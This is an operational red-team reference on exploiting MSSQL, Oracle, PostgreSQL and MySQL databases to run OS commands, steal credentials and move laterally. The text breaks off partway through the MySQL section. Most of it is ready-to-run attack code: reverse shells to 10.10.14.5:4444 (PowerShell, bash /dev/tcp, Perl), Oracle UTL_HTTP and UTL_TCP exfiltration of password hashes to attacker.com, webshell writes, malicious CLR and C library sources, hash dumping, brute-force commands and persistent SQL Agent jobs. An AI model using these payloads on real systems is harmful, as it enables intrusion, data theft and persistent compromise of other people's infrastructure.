# Database Exploitation - Comprehensive Lateral Movement Reference

> **MITRE ATT&CK Mapping**: T1210 (Exploitation of Remote Services), T1021 (Remote Services), T1505.001 (SQL Stored Procedures)
> **Tactic**: Lateral Movement, Execution, Persistence, Credential Access
> **Platforms**: Windows, Linux (MSSQL, Oracle, PostgreSQL, MySQL, Redis, MongoDB, Elasticsearch)
> **Required Permissions**: Varies (unauthenticated to DBA)
> **OPSEC Risk**: Medium (database operations generate audit logs; command execution generates process creation events)

---

## Strategic Overview

Database servers are high-value targets in enterprise networks, serving as both repositories of sensitive data and pivoting platforms for lateral movement. In red team engagements, compromised database credentials frequently provide the bridge between a web application foothold and deeper network access. As of 2025-2026, organizations increasingly deploy databases across hybrid environments --- on-premises SQL Server instances linked to Azure SQL, PostgreSQL on Kubernetes, Redis clusters backing microservices, and MongoDB Atlas for cloud-native applications. Each platform exposes unique attack surfaces ranging from built-in command execution features (MSSQL xp_cmdshell, PostgreSQL COPY PROGRAM) to exploitation of trust relationships (linked servers, replication chains).

The attack methodology for database exploitation follows a consistent pattern regardless of platform: enumerate accessible instances, authenticate (via discovered credentials, default accounts, or relay attacks), escalate privileges within the database engine, and then pivot to operating system command execution or network lateral movement. Modern database engines provide rich functionality that attackers abuse --- stored procedures, extension loading, scheduled jobs, and file I/O capabilities all serve as vectors from database access to full system compromise. The key insight for red team operators is that database access rarely remains confined to data theft; nearly every major RDBMS provides a path from SQL execution to OS-level command execution.

This reference covers exploitation techniques for seven major database platforms with focus on practical attack chains validated in 2025-2026 engagements. Each section includes enumeration, authentication, privilege escalation, command execution, file operations, credential extraction, and persistence techniques with actionable commands and tool references.

---

## 1. Microsoft SQL Server (MSSQL)

MSSQL is ubiquitous in Windows enterprise environments, tightly integrated with Active Directory, and offers extensive built-in functionality that enables lateral movement. It commonly runs on TCP/1433 (default instance) or dynamic ports (named instances via UDP/1434 browser service).

### 1.1 Enumeration and Discovery

```bash
# Discover MSSQL instances on the network
nmap -p 1433 --open -sV 10.10.10.0/24
nmap -sU -p 1434 --script ms-sql-info 10.10.10.0/24

# UDP broadcast for SQL Browser service
sudo nmap -sU -p 1434 --script ms-sql-info --script-args mssql.instance-port=1434 10.10.10.0/24

# Metasploit module
use auxiliary/scanner/mssql/mssql_ping

# PowerShell discovery (from domain-joined host)
Import-Module SQLServer
Get-SqlInstance -ServerInstance "10.10.10.0/24"

# Active Directory SPN enumeration for MSSQL
setspn -T domain.local -Q MSSQLSvc/*
# Or via PowerView:
Get-DomainSPNTicket -SPN "MSSQLSvc/*"

# SQLRecon enumeration
SQLRecon.exe /enum:sqlspns
```

### 1.2 Authentication

```bash
# SQL Authentication (username/password)
sqsh -S 10.10.10.100 -U sa -P 'Password123!'
sqlcmd -S 10.10.10.100 -U sa -P 'Password123!'
impacket-mssqlclient sa:'Password123!'@10.10.10.100

# Windows Authentication (current user context)
sqlcmd -S 10.10.10.100 -E
impacket-mssqlclient domain/user:password@10.10.10.100 -windows-auth

# NTLM Relay to MSSQL
# Use ntlmrelayx to relay captured credentials to MSSQL
impacket-ntlmrelayx -t mssql://10.10.10.100 -q "SELECT system_user"
# Trigger auth via responder, printerbug, petitpotam, etc.

# Kerberos Authentication
impacket-mssqlclient -k -no-pass domain/user@mssql.domain.local

# Brute force (use with caution - lockout risk)
hydra -L users.txt -P passwords.txt 10.10.10.100 mssql
crackmapexec mssql 10.10.10.100 -u users.txt -p passwords.txt
```

### 1.3 xp_cmdshell - Command Execution

```sql
-- Check if xp_cmdshell is enabled
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';

-- Enable xp_cmdshell (requires sysadmin)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Execute OS commands
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'ipconfig /all';
EXEC xp_cmdshell 'net user';
EXEC xp_cmdshell 'powershell -enc BASE64PAYLOAD';

-- Reverse shell via xp_cmdshell
EXEC xp_cmdshell 'powershell -nop -w hidden -c "$client = New-Object System.Net.Sockets.TCPClient(''10.10.14.5'',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"';

-- Disable after use (OPSEC)
EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;
EXEC sp_configure 'show advanced options', 0; RECONFIGURE;

-- SQLRecon command execution
SQLRecon.exe /auth:wintoken /host:10.10.10.100 /module:xpcmd /command:"whoami"
```

### 1.4 OLE Automation Procedures

```sql
-- Alternative command execution when xp_cmdshell is disabled or blocked

-- Enable OLE Automation
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;

-- Execute commands via sp_OACreate / sp_OAMethod
DECLARE @output INT;
DECLARE @shell INT;
EXEC sp_OACreate 'WScript.Shell', @shell OUTPUT;
EXEC sp_OAMethod @shell, 'Run', @output OUTPUT, 'cmd /c whoami > C:\temp\output.txt';

-- Alternative with Shell.Application
DECLARE @obj INT;
EXEC sp_OACreate 'Shell.Application', @obj OUTPUT;
EXEC sp_OAMethod @obj, 'ShellExecute', NULL, 'cmd.exe', '/c whoami > C:\temp\out.txt', '', '', 0;
```

### 1.5 CLR Assembly Execution

CLR (Common Language Runtime) integration allows loading and executing custom .NET assemblies directly within SQL Server --- a powerful lateral movement primitive.

```sql
-- Check if CLR is enabled
SELECT * FROM sys.configurations WHERE name = 'clr enabled';

-- Enable CLR integration
EXEC sp_configure 'clr enabled', 1; RECONFIGURE;
EXEC sp_configure 'clr strict security', 0; RECONFIGURE;  -- SQL Server 2017+

-- Set database to TRUSTWORTHY (required for UNSAFE assemblies)
ALTER DATABASE master SET TRUSTWORTHY ON;

-- Create assembly from hex bytes (no file needed on disk)
-- Generate hex with: msfvenom or custom C# compiled to hex
CREATE ASSEMBLY [CmdExec]
  AUTHORIZATION [dbo]
  FROM 0x4D5A... -- Hex-encoded DLL bytes
  WITH PERMISSION_SET = UNSAFE;

-- Create stored procedure from assembly
CREATE PROCEDURE [dbo].[cmd_exec]
  @cmd NVARCHAR(4000)
AS EXTERNAL NAME [CmdExec].[StoredProcedures].[cmd_exec];
GO

-- Execute
EXEC cmd_exec 'whoami';

-- Cleanup
DROP PROCEDURE cmd_exec;
DROP ASSEMBLY CmdExec;

-- SQLRecon CLR module (automated)
SQLRecon.exe /auth:wintoken /host:10.10.10.100 /module:clr /command:"whoami"
```

**Compile a custom CLR assembly (C#):**
```csharp
using System;
using System.Diagnostics;
using System.Data.SqlTypes;
using Microsoft.SqlServer.Server;

public class StoredProcedures
{
    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void cmd_exec(SqlString cmd)
    {
        Process proc = new Process();
        proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
        proc.StartInfo.Arguments = string.Format(@" /C {0}", cmd.Value);
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.RedirectStandardOutput = true;
        proc.Start();
        SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", System.Data.SqlDbType.NVarChar, 4000));
        SqlContext.Pipe.SendResultsStart(record);
        record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());
        SqlContext.Pipe.SendResultsRow(record);
        SqlContext.Pipe.SendResultsEnd();
        proc.WaitForExit();
        proc.Close();
    }
}
```

### 1.6 OPENROWSET and OPENDATASOURCE

```sql
-- File read via OPENROWSET (requires Ad Hoc Distributed Queries)
EXEC sp_configure 'Ad Hoc Distributed Queries', 1; RECONFIGURE;

-- Read file contents
SELECT * FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB) AS x;
SELECT * FROM OPENROWSET(BULK 'C:\inetpub\wwwroot\web.config', SINGLE_CLOB) AS x;

-- Write file via OPENROWSET (requires linked server or file path)
-- Alternative: BCP utility
EXEC xp_cmdshell 'bcp "SELECT ''webshell content''" queryout "C:\inetpub\wwwroot\shell.aspx" -c -S localhost -T';

-- OPENDATASOURCE for cross-server queries
SELECT * FROM OPENDATASOURCE(
  'SQLOLEDB',
  'Data Source=10.10.10.200;User ID=sa;Password=pass'
).master.dbo.sysdatabases;

-- UNC path for hash capture (NTLM relay/crack)
EXEC xp_dirtree '\\10.10.14.5\share';
EXEC xp_fileexist '\\10.10.14.5\share\test';
EXEC master..xp_subdirs '\\10.10.14.5\share';
-- Capture hash with Responder or Inveigh
```

### 1.7 Linked Server Exploitation

Linked servers enable SQL Server to execute queries against remote database instances, creating trust chains that attackers can traverse for lateral movement.

```sql
-- Enumerate linked servers
SELECT * FROM sys.servers;
EXEC sp_linkedservers;
SELECT * FROM master..sysservers;

-- Query through linked server
SELECT * FROM [LinkedServerName].[master].[dbo].[sysdatabases];

-- Execute commands on linked server using OPENQUERY
SELECT * FROM OPENQUERY([LinkedServerName], 'SELECT system_user');
SELECT * FROM OPENQUERY([LinkedServerName], 'SELECT * FROM master..syslogins');

-- Enable xp_cmdshell on linked server
EXEC('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [LinkedServerName];
EXEC('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [LinkedServerName];
EXEC('EXEC master..xp_cmdshell ''whoami''') AT [LinkedServerName];

-- Chained linked servers (double-hop, triple-hop)
-- Server A -> Server B -> Server C
SELECT * FROM OPENQUERY([ServerB], 'SELECT * FROM OPENQUERY([ServerC], ''SELECT system_user'')');

-- EXECUTE AT syntax for linked servers
EXEC ('SELECT system_user') AT [LinkedServerName];

-- Check what permissions we have on linked server
SELECT * FROM OPENQUERY([LinkedServerName], 'SELECT IS_SRVROLEMEMBER(''sysadmin'')');

-- Crawl linked server chains automatically
-- PowerUpSQL: Get-SQLServerLinkCrawl
Import-Module PowerUpSQL
Get-SQLServerLinkCrawl -Instance "10.10.10.100" -Verbose

-- SQLRecon linked server enumeration
SQLRecon.exe /auth:wintoken /host:10.10.10.100 /module:links
SQLRecon.exe /auth:wintoken /host:10.10.10.100 /module:llinks /lhost:LinkedServer /command:"whoami"
```

### 1.8 Impersonation

```sql
-- Check who we can impersonate
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

-- Database-level impersonation
SELECT distinct b.name
FROM sys.database_permissions a
INNER JOIN sys.database_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

-- Execute as another login
EXECUTE AS LOGIN = 'sa';
SELECT system_user;  -- Should show 'sa'
EXEC xp_cmdshell 'whoami';
REVERT;  -- Return to original context

-- Execute as another user (database level)
EXECUTE AS USER = 'dbo';
SELECT user_name();
REVERT;
```

### 1.9 SQL Agent Jobs for Persistence

```sql
-- Create a SQL Agent job that executes a command
USE msdb;
EXEC dbo.sp_add_job @job_name = N'SystemCheck';
EXEC dbo.sp_add_jobstep @job_name = N'SystemCheck',
  @step_name = N'Step1',
  @subsystem = N'CmdExec',
  @command = N'powershell -enc BASE64PAYLOAD',
  @retry_attempts = 0,
  @retry_interval = 0;
EXEC dbo.sp_add_jobschedule @job_name = N'SystemCheck',
  @name = N'DailySchedule',
  @freq_type = 4,
  @freq_interval = 1,
  @active_start_time = 010000;  -- 1:00 AM
EXEC dbo.sp_add_jobserver @job_name = N'SystemCheck';

-- Execute job immediately
EXEC dbo.sp_start_job N'SystemCheck';

-- List existing jobs
SELECT job_id, name, enabled, date_created FROM msdb.dbo.sysjobs;

-- Cleanup
EXEC dbo.sp_delete_job @job_name = N'SystemCheck';
```

### 1.10 Credential Extraction

```sql
-- Extract SQL login password hashes
SELECT name, password_hash FROM sys.sql_logins;
-- Crack with hashcat: hashcat -m 1731 hashes.txt wordlist.txt

-- Extract linked server credentials
-- Requires DAC (Dedicated Admin Connection) or specific permissions
SELECT sss.remote_name, sss.remote_password
FROM sys.linked_logins sll
JOIN sys.servers ss ON sll.server_id = ss.server_id
JOIN master.sys.syslnklgns sss ON sss.srvid = ss.server_id;

-- DAC connection (single admin connection, requires local or remote DAC enabled)
sqlcmd -S admin:10.10.10.100 -U sa -P 'Password123!'

-- Extract linked server passwords from memory (requires sysadmin)
-- Use SQLRecon or custom TSQL to read encrypted credentials
-- Passwords are encrypted with DPAPI tied to service account

-- Windows credentials from SQL Server process
-- If running as domain account, extract with Mimikatz on the host

-- Connection strings in database
SELECT * FROM sys.database_files;
SELECT * FROM master..sysprocesses;
```

---

## 2. Oracle Database

Oracle databases commonly run on TCP/1521 (TNS Listener) and are prevalent in enterprise environments, particularly financial and government sectors. Oracle provides extensive PL/SQL capabilities that enable OS interaction.

### 2.1 Enumeration

```bash
# TNS Listener enumeration
nmap -p 1521 --script oracle-tns-version 10.10.10.100
nmap -p 1521 --script oracle-sid-brute 10.10.10.100
nmap -p 1521 --script oracle-brute 10.10.10.100

# tnsping for service discovery
tnsping 10.10.10.100

# ODAT - Oracle Database Attacking Tool (comprehensive)
# SID enumeration
odat sidguesser -s 10.10.10.100 -p 1521

# Password guessing
odat passwordguesser -s 10.10.10.100 -p 1521 -d ORCL --accounts-file accounts.txt

# All modules scan
odat all -s 10.10.10.100 -p 1521 -d ORCL -U scott -P tiger

# oscanner
oscanner -s 10.10.10.100 -P 1521
```

### 2.2 Default Credentials

```
# Common Oracle default accounts:
# SYS/CHANGE_ON_INSTALL
# SYSTEM/MANAGER
# SCOTT/TIGER
# HR/HR
# DBSNMP/DBSNMP
# MDSYS/MDSYS
# CTXSYS/CTXSYS
# OUTLN/OUTLN
# XDB/CHANGE_ON_INSTALL
# APEX_PUBLIC_USER/ORACLE

# Connection
sqlplus scott/tiger@10.10.10.100:1521/ORCL
sqlplus SYS/password@10.10.10.100:1521/ORCL as sysdba
```

### 2.3 DBA Privilege Escalation

```sql
-- Check current privileges
SELECT * FROM session_privs;
SELECT * FROM user_role_privs;
SELECT * FROM dba_sys_privs WHERE grantee = USER;

-- Check if DBA
SELECT * FROM v$session WHERE username = USER;
SELECT GRANTED_ROLE FROM DBA_ROLE_PRIVS WHERE GRANTEE = USER;

-- Escalation via CREATE ANY PROCEDURE (if granted)
CREATE OR REPLACE PROCEDURE system.escalate
AUTHID CURRENT_USER
AS
BEGIN
  EXECUTE IMMEDIATE 'GRANT DBA TO scott';
END;
/
EXEC system.escalate;

-- Escalation via DBMS_SQL (CVE-2007-3890 style)
-- Requires CREATE PROCEDURE privilege
-- Create a procedure in SYS schema that grants DBA

-- Check for weak privileges that enable escalation:
-- CREATE ANY PROCEDURE - create procedures in any schema
-- CREATE ANY TRIGGER - create triggers on any table
-- EXECUTE ANY PROCEDURE - execute any procedure
-- ALTER SYSTEM - change system parameters
-- ALTER USER - change any user's password

-- Password change (if ALTER USER privilege)
ALTER USER SYS IDENTIFIED BY newpassword;
```

### 2.4 OS Command Execution via DBMS_SCHEDULER

```sql
-- Command execution via DBMS_SCHEDULER (11g+, requires CREATE JOB)
BEGIN
  DBMS_SCHEDULER.CREATE_JOB(
    job_name => 'cmd_exec',
    job_type => 'EXECUTABLE',
    job_action => '/bin/bash',
    number_of_arguments => 2,
    enabled => FALSE
  );
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('cmd_exec', 1, '-c');
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('cmd_exec', 2, 'id > /tmp/oracle_cmd_output');
  DBMS_SCHEDULER.ENABLE('cmd_exec');
END;
/

-- Windows variant
BEGIN
  DBMS_SCHEDULER.CREATE_JOB(
    job_name => 'cmd_exec_win',
    job_type => 'EXECUTABLE',
    job_action => 'C:\Windows\System32\cmd.exe',
    number_of_arguments => 2,
    enabled => FALSE
  );
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('cmd_exec_win', 1, '/c');
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('cmd_exec_win', 2, 'whoami > C:\temp\output.txt');
  DBMS_SCHEDULER.ENABLE('cmd_exec_win');
END;
/

-- Check job output
SELECT job_name, status, actual_start_date, additional_info
FROM dba_scheduler_job_run_details
WHERE job_name = 'CMD_EXEC';

-- Reverse shell via DBMS_SCHEDULER
BEGIN
  DBMS_SCHEDULER.CREATE_JOB(
    job_name => 'revshell',
    job_type => 'EXECUTABLE',
    job_action => '/bin/bash',
    number_of_arguments => 2,
    enabled => FALSE
  );
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('revshell', 1, '-c');
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('revshell', 2, 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1');
  DBMS_SCHEDULER.ENABLE('revshell');
END;
/

-- Cleanup
EXEC DBMS_SCHEDULER.DROP_JOB('cmd_exec');

-- ODAT automation
odat dbmsscheduler -s 10.10.10.100 -p 1521 -d ORCL -U sys -P password --sysdba --exec "whoami"
```

### 2.5 Java Stored Procedures for RCE

```sql
-- Create Java source for command execution (requires CREATE JAVA privilege)
CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED "osCMD" AS
import java.lang.*;
import java.io.*;
public class osCMD {
  public static String execCommand(String command) throws Exception {
    StringBuffer sb = new StringBuffer();
    String[] cmd = {"/bin/bash", "-c", command};
    // Windows: String[] cmd = {"cmd.exe", "/c", command};
    Runtime rt = Runtime.getRuntime();
    Process proc = rt.exec(cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) {
      sb.append(line).append("\n");
    }
    return sb.toString();
  }
};
/

-- Create PL/SQL wrapper
CREATE OR REPLACE FUNCTION os_cmd(p_command IN VARCHAR2) RETURN VARCHAR2
AS LANGUAGE JAVA
NAME 'osCMD.execCommand(java.lang.String) return java.lang.String';
/

-- Grant Java execution permissions (if SYS/DBA)
BEGIN
  DBMS_JAVA.GRANT_PERMISSION('SCOTT', 'SYS:java.io.FilePermission', '<<ALL FILES>>', 'execute');
  DBMS_JAVA.GRANT_PERMISSION('SCOTT', 'SYS:java.lang.RuntimePermission', 'writeFileDescriptor', '');
  DBMS_JAVA.GRANT_PERMISSION('SCOTT', 'SYS:java.lang.RuntimePermission', 'readFileDescriptor', '');
END;
/

-- Execute commands
SELECT os_cmd('id') FROM dual;
SELECT os_cmd('cat /etc/passwd') FROM dual;
SELECT os_cmd('whoami') FROM dual;

-- ODAT Java execution
odat java -s 10.10.10.100 -p 1521 -d ORCL -U sys -P password --sysdba --exec "whoami"
```

### 2.6 UTL_HTTP / UTL_TCP / UTL_FILE

```sql
-- HTTP requests (SSRF from database, data exfiltration)
SELECT UTL_HTTP.REQUEST('http://attacker.com/?data='||
  (SELECT username||':'||password FROM dba_users WHERE ROWNUM=1))
FROM dual;

-- UTL_TCP for raw socket connections
DECLARE
  c UTL_TCP.CONNECTION;
  ret_val PLS_INTEGER;
BEGIN
  c := UTL_TCP.OPEN_CONNECTION('attacker.com', 4444);
  ret_val := UTL_TCP.WRITE_LINE(c, 'Data exfiltrated: ' || USER);
  UTL_TCP.CLOSE_CONNECTION(c);
END;
/

-- UTL_FILE for file read/write
-- Check accessible directories
SELECT * FROM all_directories;

-- Read file
DECLARE
  f UTL_FILE.FILE_TYPE;
  buf VARCHAR2(4000);
BEGIN
  f := UTL_FILE.FOPEN('DATA_PUMP_DIR', 'target_file.txt', 'R');
  UTL_FILE.GET_LINE(f, buf);
  DBMS_OUTPUT.PUT_LINE(buf);
  UTL_FILE.FCLOSE(f);
END;
/

-- Write file
DECLARE
  f UTL_FILE.FILE_TYPE;
BEGIN
  f := UTL_FILE.FOPEN('DATA_PUMP_DIR', 'shell.jsp', 'W');
  UTL_FILE.PUT_LINE(f, '<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>');
  UTL_FILE.FCLOSE(f);
END;
/

-- ODAT file operations
odat utlfile -s 10.10.10.100 -p 1521 -d ORCL -U sys -P password --sysdba --getFile /etc/passwd /tmp/passwd
odat utlfile -s 10.10.10.100 -p 1521 -d ORCL -U sys -P password --sysdba --putFile /tmp shell.sh shell.sh
```

### 2.7 Oracle Wallet and Credential Extraction

```sql
-- Extract password hashes
SELECT username, password FROM dba_users;  -- 10g and earlier (DES hashes)
SELECT name, password, spare4 FROM sys.user$;  -- 11g+ (SHA1 + DES)

-- Oracle 11g hash format: S:HASH_SALT (SHA1)
-- Oracle 12c+ uses PBKDF2-SHA512

-- Hashcat modes:
-- Oracle 10g: -m 3100
-- Oracle 11g: -m 112
-- Oracle 12c: -m 12300

-- Check for stored credentials
SELECT * FROM sys.link$ ;  -- Database link passwords (encrypted)
SELECT * FROM dba_db_links;  -- Database links

-- TNS Poisoning (if listener is not password-protected)
-- Redirect connections through attacker's proxy to capture credentials
```

---

## 3. PostgreSQL

PostgreSQL runs on TCP/5432 by default and is widely used in web applications, cloud environments (AWS RDS, Azure Database), and Kubernetes deployments. It provides multiple paths to OS command execution through extensions, language handlers, and file operations.

### 3.1 Enumeration and Authentication

```bash
# Service discovery
nmap -p 5432 --script pgsql-brute 10.10.10.100
nmap -p 5432 --script pgsql-info 10.10.10.100

# Connection
psql -h 10.10.10.100 -U postgres -d postgres
psql "host=10.10.10.100 port=5432 dbname=postgres user=postgres password=postgres"

# Default credentials to try:
# postgres/postgres
# postgres/(empty)
# postgres/admin

# Brute force
hydra -L users.txt -P passwords.txt 10.10.10.100 postgres
crackmapexec postgres 10.10.10.100 -u users.txt -p passwords.txt

# Check version and user
SELECT version();
SELECT current_user;
SELECT session_user;
SELECT current_database();
```

### 3.2 COPY TO/FROM for File Operations

```sql
-- Read files (requires superuser or pg_read_server_files role)
COPY (SELECT '') TO '/tmp/test';  -- Test write access
CREATE TABLE tmp_file(content TEXT);
COPY tmp_file FROM '/etc/passwd';
SELECT * FROM tmp_file;
DROP TABLE tmp_file;

-- Alternative file read (PostgreSQL 10+)
SELECT pg_read_file('/etc/passwd');
SELECT pg_read_file('/etc/passwd', 0, 1000);  -- With offset and length

-- Read binary files
SELECT pg_read_binary_file('/etc/passwd');

-- Directory listing
SELECT pg_ls_dir('/etc/');
SELECT pg_ls_dir('/home/');

-- Write files
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';

-- Command execution via COPY PROGRAM (PostgreSQL 9.3+, superuser only)
COPY (SELECT '') TO PROGRAM 'id > /tmp/output';
CREATE TABLE cmd_output(line TEXT);
COPY cmd_output FROM PROGRAM 'id';
SELECT * FROM cmd_output;

-- Reverse shell via COPY PROGRAM
COPY (SELECT '') TO PROGRAM 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1';

-- Alternative reverse shell
COPY (SELECT '') TO PROGRAM 'perl -e ''use Socket;$i="10.10.14.5";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};''';
```

### 3.3 Large Objects for Binary File Access

```sql
-- Import file as large object (can handle binary files)
SELECT lo_import('/etc/passwd');  -- Returns OID
SELECT lo_import('/etc/passwd', 1337);  -- Specify OID

-- Read large object content
SELECT loid, pageno, encode(data, 'escape') FROM pg_largeobject WHERE loid = 1337;

-- Export large object to file
SELECT lo_export(1337, '/tmp/extracted_file');

-- Using large objects to upload binaries
-- 1. Create large object on attacker machine
-- 2. Upload via SQL
SELECT lo_create(9999);
-- Insert binary data in chunks
INSERT INTO pg_largeobject (loid, pageno, data) VALUES (9999, 0, decode('7f454c46...', 'hex'));
-- Export to filesystem
SELECT lo_export(9999, '/tmp/malicious_binary');

-- Cleanup
SELECT lo_unlink(1337);
```

### 3.4 Extensions for RCE

```sql
-- Check available extensions
SELECT * FROM pg_available_extensions;

-- dblink extension (cross-database queries, can reach external servers)
CREATE EXTENSION dblink;
SELECT * FROM dblink('host=10.10.10.200 user=postgres password=postgres dbname=postgres',
  'SELECT version()') AS t(result TEXT);

-- dblink for password brute-force (connect to other PostgreSQL instances)
SELECT * FROM dblink('host=10.10.10.200 dbname=postgres user=postgres password=test',
  'SELECT 1') AS t(result TEXT);
-- Connection error = wrong password; success = correct password

-- PL/Python extension (plpythonu - untrusted, allows OS access)
CREATE EXTENSION plpythonu;

CREATE FUNCTION cmd_exec(cmd TEXT) RETURNS TEXT AS $$
  import subprocess
  result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
  return result.stdout
$$ LANGUAGE plpythonu;

SELECT cmd_exec('id');
SELECT cmd_exec('cat /etc/shadow');
SELECT cmd_exec('bash -i >& /dev/tcp/10.10.14.5/4444 0>&1');

-- PL/Perl extension (plperlu - untrusted)
CREATE EXTENSION plperlu;

CREATE FUNCTION cmd_perl(cmd TEXT) RETURNS TEXT AS $$
  my $output = `$_[0]`;
  return $output;
$$ LANGUAGE plperlu;

SELECT cmd_perl('id');

-- PL/Tcl extension
CREATE EXTENSION pltclu;

CREATE FUNCTION cmd_tcl(cmd TEXT) RETURNS TEXT AS $$
  set output [exec $1]
  return $output
$$ LANGUAGE pltclu;

SELECT cmd_tcl('id');
```

### 3.5 Custom Extension Loading for RCE

```sql
-- Compile a malicious shared library
-- On attacker machine:
-- gcc -I$(pg_config --includedir-server) -shared -fPIC -o pg_exec.so pg_exec.c

-- pg_exec.c:
-- #include "postgres.h"
-- #include "fmgr.h"
-- #include <stdlib.h>
-- PG_MODULE_MAGIC;
-- PG_FUNCTION_INFO_V1(pg_exec);
-- Datum pg_exec(PG_FUNCTION_ARGS) {
--     char* cmd = text_to_cstring(PG_GETARG_TEXT_PP(0));
--     system(cmd);
--     PG_RETURN_VOID();
-- }

-- Upload via large objects (see section 3.3)
-- Then:
CREATE OR REPLACE FUNCTION cmd_exec(TEXT) RETURNS VOID AS '/tmp/pg_exec.so', 'pg_exec' LANGUAGE C STRICT;
SELECT cmd_exec('id');
```

### 3.6 PostgreSQL Credential Extraction

```sql
-- Extract user password hashes
SELECT usename, passwd FROM pg_shadow;

-- PostgreSQL hash formats:
-- MD5: md5 + MD5(password + username)  -> hashcat -m 11600
-- SCRAM-SHA-256 (PostgreSQL 10+): SCRAM-SHA-256$iterations:salt$StoredKey:ServerKey

-- Check pg_hba.conf authentication configuration
-- (requires file read access)
SELECT pg_read_file('/etc/postgresql/14/main/pg_hba.conf');
-- or
SELECT pg_read_file('/var/lib/pgsql/14/data/pg_hba.conf');

-- Check for stored credentials in .pgpass
SELECT pg_read_file('/var/lib/postgresql/.pgpass');
SELECT pg_read_file('/root/.pgpass');
```

### 3.7 CVE-2025-1094 - PostgreSQL psql SQL Injection

```
# CVE-2025-1094: SQL injection via invalid UTF-8 characters in psql
# The psql interactive tool incorrectly handles invalid UTF-8 byte sequences
# This allows SQL injection through string escaping routines
# Can chain to arbitrary code execution via psql meta-commands (\! for OS commands)

# Affected versions: PostgreSQL before 17.3, 16.7, 15.11, 14.16, 13.19
# Impact: SQL injection leading to RCE when psql processes untrusted input

# Remediation: Upgrade to fixed versions
# PostgreSQL 17.3, 16.7, 15.11, 14.16, or 13.19
```

---

## 4. MySQL / MariaDB

MySQL runs on TCP/3306 by default and is the most widely deployed open-source RDBMS. While it provides fewer built-in OS interaction features than MSSQL or PostgreSQL, several techniques enable file operations and command execution.

### 4.1 Enumeration and Authentication

```bash
# Service discovery
nmap -p 3306 --script mysql-info,mysql-enum 10.10.10.100

# Connection
mysql -h 10.10.10.100 -u root -p
mysql -h 10.10.10.100 -u root --password=''  # Empty password

# Default credentials:
# root/(empty)
# root/root
# root/mysql
# root/toor

# Brute force
hydra -L users.txt -P passwords.txt 10.10.10.100 mysql
crackmapexec mysql 10.10.10.100 -u root -p passwords.txt

# Basic enumeration
SELECT @@version;
SELECT user();
SELECT current_user();
SELECT @@datadir;
SELECT @@basedir;
SELECT @@plugin_dir;
SHOW GRANTS;
SHOW GRANTS FOR 'root'@'localhost';
```

### 4.2 File Read/Write Operations

```sql
-- Read files (requires FILE privilege)
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/etc/shadow');
SELECT LOAD_FILE('/var/www/html/config.php');
SELECT LOAD_FILE('C:\\Windows\\win.ini');

-- Hex encode to avoid display issues
SELECT HEX(LOAD_FILE('/etc/passwd'));

-- Write files (requires FILE privilege and secure_file_priv allows it)
-- Check secure_file_priv
SELECT @@secure_file_priv;
-- NULL = disabled, empty = anywhere, path = restricted to that path

-- Write webshell
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
SELECT '<?php system($_GET["cmd"]); ?>' INTO DUMPFILE '/var/www/html/shell.php';

-- Write via OUTFILE (adds newlines and escaping)
-- Write via DUMPFILE (raw binary, better for binaries)

-- Bypass secure_file_priv (if writable to that directory)
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/lib/mysql-files/shell.php';
-- Then need LFI or symlink to access the file
```

### 4.3 Log File Technique (General Log / Slow Query Log)

When `secure_file_priv` prevents direct file writes, the log file technique provides an alternative by abusing MySQL's logging functionality.

```sql
-- Check current log settings
SHOW VARIABLES LIKE 'general_log%';
SHOW VARIABLES LIKE 'slow_query_log%';

-- General log technique
SET GLOBAL general_log = 'ON';
SET GLOBAL general_log_file = '/var/www/html/shell.php';
SELECT '<?php system($_GET["cmd"]); ?>';  -- This gets logged to the file
SET GLOBAL general_log = 'OFF';

-- Slow query log technique
SET GLOBAL slow_query_log = 'ON';
SET GLOBAL slow_query_log_file = '/var/www/html/shell.php';
